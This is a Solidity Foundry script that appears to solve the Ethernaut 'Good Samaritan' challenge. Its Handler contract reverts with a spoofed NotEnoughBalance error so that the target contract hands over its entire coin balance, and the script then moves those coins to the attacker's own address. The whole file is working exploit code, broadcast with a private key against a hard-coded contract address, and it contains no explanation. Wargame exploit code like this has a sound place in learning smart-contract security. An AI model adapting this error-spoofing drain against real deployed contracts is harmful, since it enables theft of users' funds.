// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/27_Good_Smaritan.sol";

contract Handler {
    error NotEnoughBalance();
    Coin public coin;
    GoodSamaritan public samaritan;

    constructor(GoodSamaritan _samaritan, Coin _coin) {
        coin = _coin;
        samaritan = _samaritan;
    }

    function notify(uint256 _amount) external {
        if (_amount == 10){
            revert NotEnoughBalance();
        }   
    }

    function donation_plz() external {
        samaritan.requestDonation();
    }

    function send_to_myeoa() external {
        coin.transfer(tx.origin, coin.balances(address(this)));
    }

}

contract POC is Script {
    GoodSamaritan public samaritan;
    Coin public coin;
    Wallet public wallet;
    Handler public handler;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        samaritan = GoodSamaritan(0xf8E561bac7D6d84Da3061aCA84A34b5D7c20D252);
        coin = samaritan.coin();
        wallet = samaritan.wallet();
        handler = new Handler(samaritan, coin);


        uint256 wallet_balance = coin.balances(address(wallet));
        uint256 user_balance = coin.balances(vm.envAddress("MY_ADDRESS"));
        console.log("before wallet balance: ", wallet_balance);
        console.log("before  user  balance: ", user_balance);

        handler.donation_plz();
        handler.send_to_myeoa();

        wallet_balance = coin.balances(address(wallet));
        user_balance = coin.balances(vm.envAddress("MY_ADDRESS"));
        console.log("after wallet balance: ", wallet_balance);
        console.log("after  user  balance: ", user_balance);

        vm.stopBroadcast();
    }
}
